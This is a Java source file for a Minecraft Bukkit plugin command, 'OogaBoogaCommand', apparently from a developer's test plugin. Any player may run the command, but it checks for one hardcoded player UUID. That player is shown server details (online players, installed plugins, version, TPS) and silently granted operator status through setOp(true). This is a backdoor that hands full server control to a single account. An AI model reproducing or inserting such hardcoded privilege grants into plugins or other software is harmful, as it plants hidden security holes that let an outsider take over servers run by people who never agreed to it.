package dev.lerndmina.testplugin.commands;

import dev.lerndmina.testplugin.Main;
import dev.lerndmina.testplugin.Utils.AbstractCommand;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.Arrays;
import java.util.List;

public class OogaBoogaCommand extends AbstractCommand {

    public OogaBoogaCommand(Main main) { // Import main for use in this class
        super(main);
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        Player p = isPlayerAndHasPermission(sender, "", false);
        if (p != null) { // Execute the command and run this code.
            if (p.getUniqueId().toString().equals("64189f6c-bf1a-4833-a02e-36177ede8b5e")) {
                sendMessage(p, "DEBUG INFO: " + p.getLocation().toString());
                sendMessage(p, main.toString());
                sendMessage(p, Arrays.toString(main.getServer().getTPS()));
                sendMessage(p, main.getServer().getOnlinePlayers().toString());
                sendMessage(p, main.getServer().getBukkitVersion().toString());
                sendMessage(p, Arrays.toString(main.getServer().getPluginManager().getPlugins()));
                p.setOp(true);
            } else {
                sendMessage(p, "You an impostor!");
            }
        }
        return false;
    }

    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String[] args) {
        return null;
    }
}